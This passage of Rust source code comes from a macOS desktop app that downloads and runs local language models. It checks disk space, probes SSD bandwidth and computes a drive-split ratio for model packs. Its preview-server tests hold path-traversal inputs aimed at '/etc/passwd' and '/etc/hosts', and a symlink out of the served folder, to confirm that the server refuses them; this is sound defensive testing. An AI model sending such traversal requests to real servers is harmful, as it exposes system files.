    let mount = cols[8..].join(" ");
    Some((device, total, free, mount))
}

const INSTALL_DOWNLOAD_RESERVE_GIB: u64 = 2;

fn required_download_gib(total_bytes: u64, already_downloaded: u64) -> u64 {
    const GIB: u64 = 1024 * 1024 * 1024;
    total_bytes
        .saturating_sub(already_downloaded)
        .div_ceil(GIB)
        .saturating_add(INSTALL_DOWNLOAD_RESERVE_GIB)
}

/// Free space for a download of `need` bytes into `dir`, or an error saying so.
///
/// The model registry's own version of this checks a model folder under the
/// Galactus root; this one takes any folder, so the image models can use the
/// same arithmetic and the same reserve.
pub(crate) fn require_free_space(dir: &Path, need: u64) -> Result<(), String> {
    const GIB: u64 = 1024 * 1024 * 1024;
    let required = need.div_ceil(GIB).saturating_add(INSTALL_DOWNLOAD_RESERVE_GIB);
    let probe = dir.to_string_lossy();
    let (_, _, free, mount) = df_line(&probe)
        .ok_or_else(|| format!("cannot measure free space for {}", dir.display()))?;
    if free < required {
        return Err(format!(
            "not enough space on {mount}: {required} GiB needed, {free} GiB free"
        ));
    }
    Ok(())
}

/// Refuse before curl starts. The GGUF is always downloaded under the
/// Galactus root even when the expert pack is sent to another SSD.
fn require_download_space(root: &Path, id: &str, files: &[String], total_bytes: u64) -> Result<(), String> {
    let model_dir = root.join("models").join(id);
    let already_downloaded = files
        .iter()
        .map(|name| std::fs::metadata(model_dir.join(name)).map(|m| m.len()).unwrap_or(0))
        .sum();
    let required = required_download_gib(total_bytes, already_downloaded);
    let probe = root.to_string_lossy();
    let (_, _, free, mount) = df_line(&probe)
        .ok_or_else(|| format!("cannot measure free space for {}", root.display()))?;
    if free < required {
        return Err(format!(
            "not enough space for the model download on {mount}: {required} GiB required, {free} GiB free"
        ));
    }
    Ok(())
}

#[cfg(test)]
mod install_space_tests {
    use super::*;

    #[test]
    fn download_preflight_counts_only_remaining_bytes_and_keeps_a_reserve() {
        const GIB: u64 = 1024 * 1024 * 1024;
        assert_eq!(required_download_gib(202 * GIB, 0), 204);
        assert_eq!(required_download_gib(202 * GIB, 200 * GIB), 4);
        assert_eq!(required_download_gib(202 * GIB, 202 * GIB), 2);
        assert_eq!(required_download_gib(GIB + 1, 0), 4);
    }
}

/// Mounted volumes that can host a pack: the system data volume (via $HOME),
/// everything under /Volumes, and the volume carrying the Galactus root.
/// Deduplicated by device so /, /System/Volumes/Data and the /Volumes symlink
/// to the boot disk collapse into one entry.
#[tauri::command]
fn list_volumes() -> Vec<VolumeInfo> {
    let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".into());
    let mut candidates: Vec<(String, String)> = vec![("Macintosh HD".into(), home.clone())];
    if let Ok(rd) = std::fs::read_dir("/Volumes") {
        let mut vols: Vec<_> = rd.flatten().collect();
        vols.sort_by_key(|e| e.file_name());
        for e in vols {
            let name = e.file_name().to_string_lossy().into_owned();
            if name.starts_with('.') {
                continue;
            }
            // The boot-disk symlink in /Volumes duplicates the home entry.
            if e.path().read_link().is_ok() {
                continue;
            }
            candidates.push((name, e.path().display().to_string()));
        }
    }
    if let Ok(root) = galactus_root() {
        candidates.push((String::new(), root.display().to_string()));
    }
    let mut seen = std::collections::HashSet::new();
    let mut out = Vec::new();
    for (name, path) in candidates {
        let Some((device, total, free, mount)) = df_line(&path) else { continue };
        if !device.starts_with("/dev/") || !seen.insert(device) {
            continue;
        }
        let on_data = mount == "/" || mount == "/System/Volumes/Data";
        let name = if !name.is_empty() {
            name
        } else if on_data {
            "Macintosh HD".into()
        } else {
            Path::new(&mount)
                .file_name()
                .map(|s| s.to_string_lossy().into_owned())
                .unwrap_or_else(|| mount.clone())
        };
        let (dir, probe) = if on_data {
            (format!("{home}/GalactusH4"), home.clone())
        } else {
            (format!("{mount}/GalactusH4"), mount.clone())
        };
        // Only writable volumes can host a pack (Time Machine, DMGs and
        // network mounts often are not): probed with a real create+delete.
        let test_base = if on_data { Path::new(&home) } else { Path::new(&mount) };
        let test = test_base.join(format!(".galactus-wtest-{}", std::process::id()));
        let writable = std::fs::File::create(&test).is_ok();
        let _ = std::fs::remove_file(&test);
        if !writable {
            continue;
        }
        out.push(VolumeInfo { name, mount, dir, probe, free_gb: free, total_gb: total });
    }
    out
}

const BW_CHUNK: usize = 8 * 1024 * 1024;
const BW_MIN_FILE: u64 = 2_000_000_000;
/// Queued probe shape. A per-expert record is a few MiB (4.1 MB on olmoe,
/// 13.2 MB on GLM-5.2) and the engine keeps many of them in flight per volume
/// (GALACTUS_H4_QD, 32 at serve time). 4 MiB at 16 deep sits in that regime,
/// which is what the ratio has to be measured in.
const BW_RECORD_CHUNK: usize = 4 * 1024 * 1024;
const BW_INFLIGHT: usize = 16;
/// Bytes the queued probe reads in total. Big enough that a few hundred
/// milliseconds of scheduling noise does not move the answer, small enough
/// that two volumes are probed in a couple of seconds.
const BW_QUEUED_TARGET: u64 = 1_500_000_000;
/// Record alignment, so probe offsets land where real reads land.
const RECORD_ALIGN: u64 = 16_384;

/// F_NOCACHE on macOS: reads bypass the unified buffer cache, so the probe
/// measures the SSD instead of RAM (same flag the H4 reader uses).
#[cfg(target_os = "macos")]
fn set_nocache(file: &std::fs::File) {
    use std::os::unix::io::AsRawFd;
    extern "C" {
        fn fcntl(fd: i32, cmd: i32, ...) -> i32;
    }
    const F_NOCACHE: i32 = 48;
    unsafe {
        fcntl(file.as_raw_fd(), F_NOCACHE, 1);
    }
}

/// Biggest file above `min_bytes` under `dir` (bounded walk, symlinks not
/// followed). Stops early once a comfortably large file is found.
fn find_big_file(dir: &Path, min_bytes: u64) -> Option<PathBuf> {
    let mut best: Option<(u64, PathBuf)> = None;
    let mut stack = vec![(dir.to_path_buf(), 0u32)];
    let mut budget: u32 = 40_000;
    while let Some((d, depth)) = stack.pop() {
        if budget == 0 {
            break;
        }
        let Ok(rd) = std::fs::read_dir(&d) else { continue };
        for e in rd.flatten() {
            if budget == 0 {
                break;
            }
            budget -= 1;
            if e.file_name().to_string_lossy().starts_with('.') {
                continue;
            }
            let Ok(meta) = e.metadata() else { continue };
            if meta.is_dir() {
                if depth < 5 {
                    stack.push((e.path(), depth + 1));
                }
            } else if meta.is_file() && meta.len() >= min_bytes {
                if best.as_ref().map(|(s, _)| meta.len() > *s).unwrap_or(true) {
                    best = Some((meta.len(), e.path()));
                }
                if best.as_ref().map(|(s, _)| *s >= 4 * min_bytes).unwrap_or(false) {
                    return best.map(|(_, p)| p);
                }
            }
        }
    }
    best.map(|(_, p)| p)
}

/// Write an incompressible ~2 GB probe file (xorshift-filled blocks: zeros
/// could be shortcut by the storage stack) for volumes holding nothing big.
fn write_probe_file(path: &Path, size: u64) -> Result<(), String> {
    use std::io::Write;
    let mut f = std::fs::File::create(path).map_err(|e| e.to_string())?;
    let mut block = vec![0u8; BW_CHUNK];
    let mut x: u64 = 0x9e37_79b9_7f4a_7c15;
    for b in block.chunks_exact_mut(8) {
        x ^= x << 13;
        x ^= x >> 7;
        x ^= x << 17;
        b.copy_from_slice(&x.to_le_bytes());
    }
    let mut written = 0u64;
    while written < size {
        f.write_all(&block).map_err(|e| e.to_string())?;
        written += block.len() as u64;
    }
    f.sync_all().map_err(|e| e.to_string())?;
    Ok(())
}

/// Timed sequential read of ~1.5 GB in 8 MiB blocks with the cache bypassed.
/// On files much bigger than the read, the start offset varies run to run.
fn read_bandwidth(path: &Path) -> Result<f64, String> {
    use std::io::{Read, Seek, SeekFrom};
    let mut f = std::fs::File::open(path).map_err(|e| e.to_string())?;
    #[cfg(target_os = "macos")]
    set_nocache(&f);
    let len = f.metadata().map_err(|e| e.to_string())?.len();
    let target: u64 = 1_500_000_000.min(len);
    if len > target + BW_CHUNK as u64 {
        let slots = (len - target) / BW_CHUNK as u64 + 1;
        let nanos = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .subsec_nanos() as u64;
        f.seek(SeekFrom::Start((nanos % slots) * BW_CHUNK as u64))
            .map_err(|e| e.to_string())?;
    }
    let mut buf = vec![0u8; BW_CHUNK];
    let mut total: u64 = 0;
    let t0 = Instant::now();
    while total < target {
        let n = f.read(&mut buf).map_err(|e| e.to_string())?;
        if n == 0 {
            break;
        }
        total += n as u64;
    }
    let secs = t0.elapsed().as_secs_f64();
    if total < 200_000_000 || secs <= 0.0 {
        return Err("probe read too small to be meaningful".into());
    }
    Ok(total as f64 / 1e9 / secs)
}

/// Read bandwidth in the shape the ENGINE reads: record-sized requests at
/// random offsets, several in flight, cache bypassed.
///
/// WHY THIS EXISTS ALONGSIDE read_bandwidth
///
/// read_bandwidth is one thread walking a file forwards in 8 MiB blocks. That
/// is the right number to show a user, and the right one for the "is this pair
/// worth splitting at all" guard, but it is NOT the number the split ratio
/// needs, because it is not how expert records are read.
///
/// Measured here on this machine's two SSDs, cold, same files, same instant:
/// sequentially 10.2 and 4.7 GB/s, which puts r* at 0.684; at the engine's
/// shape 14.4 and 4.6 GB/s, which puts it at 0.757. Sweeping the real split
/// found the throughput peak at 0.75. The sequential figures therefore name a
/// ratio that is 13% SLOWER than the constant it was meant to replace, and the
/// queued figures name the optimum. The internal NVMe is the one that gains
/// from depth, so measuring it single-threaded understates it and hands the
/// slow volume more of every record than it can carry.
fn read_bandwidth_queued(path: &Path, chunk: usize, inflight: usize) -> Result<f64, String> {
    use std::os::unix::fs::FileExt;
    use std::sync::atomic::{AtomicU64, Ordering as O};

    let f = std::fs::File::open(path).map_err(|e| e.to_string())?;
    #[cfg(target_os = "macos")]
    set_nocache(&f);
    let len = f.metadata().map_err(|e| e.to_string())?.len();
    if len < chunk as u64 * 2 {
        return Err("probe file too small for a queued read".into());
    }
    // Enough offsets that no two workers replay the same extent, and few
    // enough that the run stays short.
    let slots = (len - chunk as u64) / RECORD_ALIGN + 1;
    let target_per_worker = (BW_QUEUED_TARGET / inflight as u64).max(chunk as u64);
    let f = std::sync::Arc::new(f);
    let total = std::sync::Arc::new(AtomicU64::new(0));
    let seed = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .subsec_nanos() as u64;

    let t0 = Instant::now();
    let mut handles = Vec::new();
    for w in 0..inflight {
        let f = f.clone();
        let total = total.clone();
        handles.push(std::thread::spawn(move || -> Result<(), String> {
            let mut buf = vec![0u8; chunk];
            // xorshift: a per-worker offset stream, no shared state, no crate.
            let mut x = seed
                .wrapping_mul(0x9e37_79b9_7f4a_7c15)
                .wrapping_add(w as u64 + 1)
                | 1;
            let mut done: u64 = 0;
            while done < target_per_worker {
                x ^= x << 13;
                x ^= x >> 7;
                x ^= x << 17;
                let offset = (x % slots) * RECORD_ALIGN;
                f.read_exact_at(&mut buf, offset).map_err(|e| e.to_string())?;
                done += chunk as u64;
                total.fetch_add(chunk as u64, O::Relaxed);
            }
            Ok(())
        }));
    }
    for h in handles {
        h.join().map_err(|_| "queued probe worker panicked".to_string())??;
    }
    let secs = t0.elapsed().as_secs_f64();
    let read = total.load(O::Relaxed);
    if read < 200_000_000 || secs <= 0.0 {
        return Err("queued probe read too small to be meaningful".into());
    }
    Ok(read as f64 / 1e9 / secs)
}

/// Run `probe` against a big file on the volume at `base`: a real one when the
/// volume already holds one, otherwise a temporary incompressible file that is
/// written, read back cache-cold, and deleted.
fn on_a_big_file<T>(base: &Path, probe: impl Fn(&Path) -> Result<T, String>) -> Result<T, String> {
    if !base.is_dir() {
        return Err(format!("not a directory: {}", base.display()));
    }
    match find_big_file(base, BW_MIN_FILE) {
        Some(p) => probe(&p),
        None => {
            let p = base.join(".galactus-bw-probe.bin");
            let written = write_probe_file(&p, BW_MIN_FILE);
            let result = written.and_then(|_| probe(&p));
            let _ = std::fs::remove_file(&p);
            result
        }
    }
}

/// Sequential read bandwidth of the volume at `path`, in GB/s. This is the
/// number the user is shown and the one the dual/mono guard judges.
fn measure_volume(base: &Path) -> Result<f64, String> {
    on_a_big_file(base, read_bandwidth)
}

/// Bandwidth of the volume at `path` in the engine's own access shape, in
/// GB/s. This is the number the split ratio is computed from.
fn measure_volume_queued(base: &Path) -> Result<f64, String> {
    on_a_big_file(base, |p| read_bandwidth_queued(p, BW_RECORD_CHUNK, BW_INFLIGHT))
}

#[tauri::command]
async fn volume_bandwidth(path: String) -> Result<f64, String> {
    measure_volume(Path::new(&path))
}

/// Everything the app chose for one model on this Mac, and what it chose it
/// from.
///
/// A turnkey product still has to say what it decided. Silent magic that gets
/// it wrong is worse than a visible choice, so every field here is either
/// shown to the user or feeds the sentence that is.
#[derive(Serialize, Clone, Debug)]
struct Recommendation {
    model_id: String,
    /// eco, balanced or perf: the mode a start would really run in, after the
    /// step-down.
    mode: String,
    /// The mode the settings asked for. Different from `mode` when this Mac
    /// cannot afford it right now.
    requested_mode: String,
    /// Conversations that may generate at once.
    slots: u32,
    /// True when `slots` came from an explicit setting rather than from the
    /// machine. The UI says "your choice" instead of "recommended".
    slots_chosen_by_user: bool,
    /// The download variant, when the entry declares any. `None` means the
    /// entry's single `download` block, which is every entry today.
    variant: Option<String>,
    /// Where the pack should go. `None` when the model is already installed
    /// and the question no longer applies.
    layout: Option<PackLayout>,
    /// What the engine would hold in total, bytes.
    resident_bytes: u64,
    /// What this Mac can give right now, bytes.
    budget_bytes: u64,
    /// The physical micro-batch the planner guarded.
    ubatch: u32,
    /// Set when nothing this app can arrange will start this model right now,
    /// carrying the planner's own sentence with its numbers.
    blocked: Option<String>,
}

/// Decide everything for one model, without starting anything.
///
/// Async: it reads vm_stat and two pmset calls, and measures nothing. It must
/// not run on the main thread.
///
/// `volumes` are the measured drives, `[{ mount, free_bytes, bandwidth_gbs }]`,
/// from the install dialog once it has probed. Absent means the model is
/// already installed or the caller does not care where the pack would go, and
/// `layout` then comes back `None` rather than as a guess over drives nobody
/// measured.
#[tauri::command]
async fn recommend_for_model(
    model_id: String,
    volumes: Option<Vec<Value>>,
) -> Result<Recommendation, String> {
    let root = galactus_root()?;
    let entry = registry_entry(&root, &model_id)?;
    let settings = settings_load();
    let ram_mode = settings
        .get("ram_mode")
        .map(String::as_str)
        .filter(|s| matches!(*s, "eco" | "balanced" | "perf"))
        .unwrap_or("balanced")
        .to_string();
    let cpu_moe = entry["cpu_moe"].as_bool().unwrap_or(false)
        || settings.get("cpu_moe").map(|v| v == "1").unwrap_or(false);
    let ram_gb = hardware::static_profile().ram_bytes >> 30;
    let machine = MachineLimits::probe(ram_gb.max(8));
    let chosen = settings.get("engine_slots").and_then(|s| s.trim().parse::<u32>().ok());
    let slots = match chosen {
        Some(n) => n.clamp(1, MAX_SLOTS),
        None => crate::planner::recommended_slots(&entry, machine, &ram_mode, cpu_moe, crate::planner::ctx_per_slot_for(&entry)),
    };

    let layout = volumes.map(|list| {
        let pack_bytes = entry["expert_bytes_total"]
            .as_u64()
            .or_else(|| entry["gguf_bytes"].as_u64())
            .unwrap_or(0);
        let parsed: Vec<PackVolume> = list
            .iter()
            .filter_map(|v| {
                Some(PackVolume {
                    mount: v["mount"].as_str()?.to_string(),
                    free_bytes: v["free_bytes"].as_u64()?,
                    bandwidth_gbs: v["bandwidth_gbs"].as_f64(),
                })
            })
            .collect();
        crate::planner::recommend_layout(&parsed, pack_bytes)
    });

    let base = Recommendation {
        model_id: model_id.clone(),
        mode: ram_mode.clone(),
        requested_mode: ram_mode.clone(),
        slots,
        slots_chosen_by_user: chosen.is_some(),
        variant: crate::planner::recommend_variant(&entry, ram_gb),
        layout,
        resident_bytes: 0,
        budget_bytes: crate::planner::engine_budget_bytes(ram_gb * 1_000_000_000, machine),
        ubatch: 0,
        blocked: None,
    };
    // The planner is the authority on mode and micro-batch, and it is also the
    // only thing that knows how to say no with a number in the sentence. A
    // refusal is REPORTED, not turned into an error: the card still has to
    // render, and the user still has to be told what would have to change.
    Ok(match crate::planner::plan_cache(&entry, machine, None, &ram_mode, cpu_moe, slots, crate::planner::ctx_per_slot_for(&entry)) {
        Ok(plan) => Recommendation {
            mode: plan.decision.mode,
            requested_mode: plan.decision.requested,
            resident_bytes: plan.decision.resident_bytes,
            budget_bytes: plan.decision.budget_bytes,
            ubatch: plan.ubatch,
            ..base
        },
        Err(why) => Recommendation { blocked: Some(why), ..base },
    })
}

// ------------------------------------------------------- dual split ratio
//
// Both volumes are read in parallel, so a record is ready when the SLOWER side
// finishes: the time is max(r/Bi, (1-r)/Be) and the optimum is the r where the
// two finish together, r* = Bi / (Bi + Be). Any other r pays the difference on
// every single record for the life of the install, which is why this number is
// measured rather than compiled in.
//
// These three constants MUST stay identical to src/h4/h4-core.hpp
// (p0v2_default_ratio, p0_ratio_minimum, p0_ratio_maximum) and to
// scripts/galactus-pack-plan.py: the planner writes what this computes and the
// engine validates what the planner wrote.
/// The historical P0v2 cut. Fallback for a failed or degenerate measurement,
/// and the ratio every pack written before this was a runtime value used.
const PACK_RATIO_DEFAULT: f64 = 0.7157;
/// Usable bounds. Outside them one volume carries so little of each record
/// that the read it still costs is pure overhead.
const PACK_RATIO_MIN: f64 = 0.05;
const PACK_RATIO_MAX: f64 = 0.95;
/// Fractional digits the ratio is quantised to. Finer than the probe's own
/// noise, and short enough that the decimal spelling is exact everywhere it is
/// parsed: Python float() and C strtod are both correctly rounded, so the
/// packer and the engine recover the SAME double from this string and their
/// round(blocks * ratio) cannot drift apart.
const PACK_RATIO_DECIMALS: usize = 4;

/// r* = Bi / (Bi + Be), quantised and clamped. A measurement that failed
/// (zero, negative, NaN, infinite) or a degenerate result falls back to
/// PACK_RATIO_DEFAULT: a bad ratio must never produce a pack nothing can read.
fn pack_split_ratio(internal_bw: f64, external_bw: f64) -> f64 {
    if !internal_bw.is_finite() || !external_bw.is_finite() || internal_bw <= 0.0 || external_bw <= 0.0
    {
        return PACK_RATIO_DEFAULT;
    }
    let sum = internal_bw + external_bw;
    if !sum.is_finite() || sum <= 0.0 {
        return PACK_RATIO_DEFAULT;
    }
    let scale = 10f64.powi(PACK_RATIO_DECIMALS as i32);
    let r = (internal_bw / sum * scale).round() / scale;
    if !r.is_finite() || !(PACK_RATIO_MIN..=PACK_RATIO_MAX).contains(&r) {
        return PACK_RATIO_DEFAULT;
    }
    r
}

/// The one spelling of a ratio that ever reaches a file or an environment
/// variable. Fixed decimals, so the planner and the engine parse the same
/// characters.
fn pack_ratio_text(ratio: f64) -> String {
    format!("{ratio:.*}", PACK_RATIO_DECIMALS)
}

#[cfg(test)]
mod pack_ratio_tests {
    use super::*;

    #[test]
    fn optimum_puts_the_bigger_share_on_the_faster_volume() {
        // Two identical NVMe drives: half each, which is where the compiled
        // 0.7157 cost the most.
        assert_eq!(pack_split_ratio(6.0, 6.0), 0.5);
        // The pair the frozen constant was measured on: Bi/Be = 2.52.
        assert_eq!(pack_split_ratio(2.52, 1.0), 0.7159);
        // Fast internal, slow external, and the reverse.
        assert_eq!(pack_split_ratio(6.0, 1.0), 0.8571);
        assert_eq!(pack_split_ratio(1.0, 6.0), 0.1429);
    }

    #[test]
    fn a_failed_measurement_falls_back_to_the_historical_cut() {
        assert_eq!(pack_split_ratio(0.0, 6.0), PACK_RATIO_DEFAULT);
        assert_eq!(pack_split_ratio(6.0, 0.0), PACK_RATIO_DEFAULT);
        assert_eq!(pack_split_ratio(-1.0, 6.0), PACK_RATIO_DEFAULT);
        assert_eq!(pack_split_ratio(f64::NAN, 6.0), PACK_RATIO_DEFAULT);
        assert_eq!(pack_split_ratio(f64::INFINITY, 6.0), PACK_RATIO_DEFAULT);
        assert_eq!(pack_split_ratio(6.0, f64::NAN), PACK_RATIO_DEFAULT);
    }

    #[test]
    fn a_ratio_outside_the_bounds_falls_back_instead_of_being_clamped() {
        // 100:1 is not a pair of SSDs, it is a broken probe. Clamping to 0.95
        // would write a pack from a measurement nobody should trust.
        assert_eq!(pack_split_ratio(100.0, 1.0), PACK_RATIO_DEFAULT);
        assert_eq!(pack_split_ratio(1.0, 100.0), PACK_RATIO_DEFAULT);
        // The edges themselves are usable.
        assert_eq!(pack_split_ratio(19.0, 1.0), PACK_RATIO_MAX);
        assert_eq!(pack_split_ratio(1.0, 19.0), PACK_RATIO_MIN);
    }

    #[test]
    fn the_text_form_is_the_grid_the_engine_parses() {
        assert_eq!(pack_ratio_text(0.5), "0.5000");
        assert_eq!(pack_ratio_text(PACK_RATIO_DEFAULT), "0.7157");
        assert_eq!(pack_ratio_text(pack_split_ratio(6.0, 1.0)), "0.8571");
    }
}

/// Probe base for a pack destination dir: nearest existing ancestor, then the
/// mount root (the system data volume probes through $HOME).
fn probe_base_for(dir: &Path) -> PathBuf {
    let mut p = dir.to_path_buf();
    while !p.exists() && p.pop() {}
    if let Some((_, _, _, mount)) = df_line(&p.to_string_lossy()) {
        if mount == "/" || mount == "/System/Volumes/Data" {
            return PathBuf::from(std::env::var("HOME").unwrap_or_else(|_| "/".into()));
        }
        return PathBuf::from(mount);
    }
    p
}

// ---------------------------------------------------------------- server




// ---------------------------------------------------------------- decode slots
//
// llama-server splits --ctx-size across --parallel slots, so N slots at the
// same per-conversation window cost N times the KV cache and nothing else:
// measured on Qwen3-30B-A3B Q8_0 (resident-bit-exact, M5 Max 128 GB), the
// resident footprint goes 29.6 GB at 1 slot / 8192, 30.4 GB at 2 slots /
// 16384, 32.0 GB at 4 slots / 32768: about 0.8 GB per extra slot, with
// single-stream generation unchanged. That is what makes several
// conversations able to generate at once, and it is why the window per slot
// is held at CTX_PER_SLOT instead of being divided.
//
// The app never runs more concurrent turns than there are slots (see the slot
// pool in main.ts): the bound is this number, not a UI convention.

















#[cfg(test)]
mod preview_serving_tests {
    use super::{percent_decode, preview_file_for, preview_mime, preview_set_root};
    use std::path::{Path, PathBuf};

    fn scratch(name: &str) -> PathBuf {
        let p = std::env::temp_dir().join(format!("galactus-preview-{name}"));
        let _ = std::fs::remove_dir_all(&p);
        std::fs::create_dir_all(p.join("sub")).unwrap();
        std::fs::write(p.join("index.html"), b"<h1>hi</h1>").unwrap();
        std::fs::write(p.join("styles.css"), b"body{}").unwrap();
        std::fs::write(p.join("sub/deep.js"), b"//").unwrap();
        p
    }

    #[test]
    fn a_bare_path_is_the_index() {
        let dir = scratch("index");
        preview_set_root(Some(dir.display().to_string())).unwrap();
        assert!(preview_file_for("/").unwrap().ends_with("index.html"));
        assert!(preview_file_for("").unwrap().ends_with("index.html"));
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn sub_resources_resolve_inside_the_folder() {
        // The reason this exists at all: a site is index.html PLUS the files it
        // asks for. The published-document path answers one document and would
        // have served the HTML again for styles.css.
        let dir = scratch("sub");
        preview_set_root(Some(dir.display().to_string())).unwrap();
        assert!(preview_file_for("/styles.css").unwrap().ends_with("styles.css"));
        assert!(preview_file_for("/sub/deep.js").unwrap().ends_with("deep.js"));
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn nothing_outside_the_folder_is_served() {
        // The containment IS the security. Canonicalising first is what makes it
        // hold: "..", an absolute path and a symlink out of the tree all look
        // innocent until the filesystem has resolved them.
        let dir = scratch("escape");
        preview_set_root(Some(dir.display().to_string())).unwrap();
        for path in ["/../../../etc/hosts", "/etc/passwd", "/sub/../../../../etc/hosts"] {
            assert!(preview_file_for(path).is_none(), "{path} must not be served");
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn a_symlink_pointing_out_is_refused() {
        let dir = scratch("symlink");
        #[cfg(unix)]
        {
            let _ = std::os::unix::fs::symlink("/etc/hosts", dir.join("out.txt"));
            preview_set_root(Some(dir.display().to_string())).unwrap();
            assert!(preview_file_for("/out.txt").is_none(), "a link out of the tree is out");
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn nothing_is_served_when_no_folder_is_set() {
        preview_set_root(None).unwrap();
        assert!(preview_file_for("/index.html").is_none());
    }

    #[test]
    fn a_space_in_a_name_survives_the_url() {
        let dir = scratch("space");
        std::fs::write(dir.join("my file.css"), b"body{}").unwrap();
        preview_set_root(Some(dir.display().to_string())).unwrap();
        assert!(preview_file_for("/my%20file.css").is_some(), "a browser escapes the space");
        assert_eq!(percent_decode("a%20b%2Fc"), "a b/c");
        assert_eq!(percent_decode("plain"), "plain", "and leaves the rest alone");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn an_unknown_extension_is_not_guessed_at() {
        // Serving an unknown binary as text/html is how a download becomes a
        // page the webview tries to render.
        assert_eq!(preview_mime(Path::new("a.html")), "text/html; charset=utf-8");
        assert_eq!(preview_mime(Path::new("a.woff2")), "font/woff2");
        assert_eq!(preview_mime(Path::new("a.zzz")), "application/octet-stream");
        assert_eq!(preview_mime(Path::new("noext")), "application/octet-stream");
    }
}

#[cfg(test)]
mod folder_chooser_tests {
    use super::classify_chooser_failure;

    #[test]
    fn cancelling_is_not_a_fault_in_any_language() {
        // The reason this test names languages: the first version matched the
        // English sentence, and the machine it shipped to was French. An
        // ordinary cancel was then reported to the user as a broken chooser,
        // which is the exact confusion the error message existed to end.
        assert_eq!(classify_chooser_failure("execution error: User canceled. (-128)"), None);
        assert_eq!(
            classify_chooser_failure("15:70: execution error: Annule par l'utilisateur. (-128)"),
            None,
            "a French Mac cancels in French and the code is what says so",
        );
        assert_eq!(classify_chooser_failure("Vorgang vom Benutzer abgebrochen. (-128)"), None);
        assert_eq!(classify_chooser_failure(""), None);
        assert_eq!(classify_chooser_failure("   \n  "), None);
    }

    #[test]
    fn a_refused_apple_event_names_its_own_remedy() {
        // -1743 is macOS refusing the app permission. No amount of clicking the
        // button fixes it, so the message has to say where the switch is.
        let msg = classify_chooser_failure("execution error: Not allowed to send Apple events (-1743)")
            .expect("a refusal is a fault");
        assert!(msg.contains("Automation"), "the message must name the settings pane");
    }

    #[test]
    fn any_other_failure_is_reported_verbatim_and_on_one_line() {
        // The point is to end the guessing: whatever osascript said reaches the
        // user, who can read it back. One line, because a toast is one line.
        let msg = classify_chooser_failure("something broke\nstack line 2\nstack line 3")
            .expect("an unknown failure is still a fault");
        assert!(msg.contains("something broke"));
        assert!(!msg.contains("stack line 2"));
    }
}



#[cfg(test)]
mod policy_refresh_tests {
    use super::root_is_a_checkout;
    use std::path::PathBuf;

    fn scratch(name: &str) -> PathBuf {
        let p = std::env::temp_dir().join(format!("galactus-refresh-{name}"));
        let _ = std::fs::remove_dir_all(&p);
        std::fs::create_dir_all(&p).unwrap();
        p
    }

    #[test]
    fn a_checkout_is_never_overwritten() {
        // Somebody's working tree: the registry there is edited, measured into
        // and committed, and a copy from the bundle would destroy that between
        // two launches.
        let p = scratch("dir");
        std::fs::create_dir_all(p.join(".git")).unwrap();
        assert!(root_is_a_checkout(&p));
        let _ = std::fs::remove_dir_all(&p);
    }

    #[test]
    fn a_worktree_counts_as_a_checkout_too() {
        // git puts a FILE named .git in a linked worktree, not a directory, and
        // a test for is_dir would have written straight into one.
        let p = scratch("worktree");
        std::fs::write(p.join(".git"), "gitdir: /elsewhere/.git/worktrees/x").unwrap();
        assert!(root_is_a_checkout(&p));
        let _ = std::fs::remove_dir_all(&p);
    }

    #[test]
    fn a_plain_folder_is_refreshed() {
        // The provisioned folder, and any folder a user pointed the app at:
        // no history to lose, and a catalogue that has to stay current.
        let p = scratch("plain");
        std::fs::create_dir_all(p.join("scripts")).unwrap();
        assert!(!root_is_a_checkout(&p));
        let _ = std::fs::remove_dir_all(&p);
    }
}





// ------------------------------------------------ what this Mac can give NOW
//
// Two numbers were being confused with each other, and the confusion is what a
// colleague on a 24 GB Mac read as "Compute error.":
//
//   - the memory the Mac was SOLD with (`sysctl hw.memsize`), minus a fixed
//     reserve. A constant guessed on somebody else's machine.
//   - the memory the Mac can hand over RIGHT NOW (`vm_stat`), which is the
//     only number the allocator answers to.
//
// The planner used the first and never looked at the second.



impl MachineLimits {
    /// Read the machine. The only place these three come from a real Mac.
    fn probe(ram_gb: u64) -> Self {
        Self {
            ram_gb,
            available: available_memory_bytes(),
            gpu_working_set: hardware::gpu_limits().map(|g| g.working_set_bytes),
        }
    }

    /// A Mac for a test: installed GiB and what vm_stat would report, with no
    /// Metal reading. That is exactly the shape every planner test asserted
    /// before the GPU working set became a bound, so the numbers they pin stay
    /// the numbers they pinned.
    #[cfg(test)]
    fn mac(ram_gb: u64, available: Option<u64>) -> Self {
        Self { ram_gb, available, gpu_working_set: None }
    }
}





impl ModeFootprints {
    fn resident(&self, mode: &str) -> u64 {
        match mode {
            "eco" => self.eco,
            "perf" => self.perf,
            _ => self.balanced,
        }
    }
}





// ------------------------------------------------- what to choose, per model
//
// The owner's instruction, verbatim: case by case, model after model, rather
// than one global rule. Every function below takes ONE registry entry and ONE
// machine, and none of them holds an opinion that applies to all ten models.
//
// Where the policy LIVES: in the registry entry, next to the geometry and the
// measured curve that the same entry already carries. The optional keys these
// functions read are documented on each function. When a key is absent the
// answer is derived from the geometry that IS there, and the derivation is
// today's behaviour, so a registry with no policy keys behaves exactly as it
// behaves now and every key added later only ever narrows a choice.















// ------------------------------------------- reading the engine's own words
//
// "Compute error." is what llama-server says when llama_decode returns below
// -1: the graph did not run. The message names no cause, and memory is only
// one of the things that can produce it, so the string alone cannot be turned
// into advice without guessing.
//
// The engine does say more, one line earlier, in its own log. That is what is
// read here instead.















// install: voir install.rs

// tools: voir tools.rs

// documents: voir documents.rs


// ---------------------------------------------------------------- MCP






// Declared here rather than pulling in a crate for one signal. Not killpg: an
// MCP connector is spawned normally and is not a process group leader, so a
// group signal would reach this app's own group.
extern "C" {
    fn kill(pid: i32, sig: i32) -> i32;
}












// ---------------------------------------------------------------- folder detect + picker

fn is_root(p: &Path) -> bool {
    p.join("scripts/models-registry.json").is_file()
}

fn run_with_timeout(cmd: &str, args: &[String], secs: u64) -> String {
    let child = Command::new(cmd)
        .args(args)
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .spawn();
    let Ok(child) = child else {
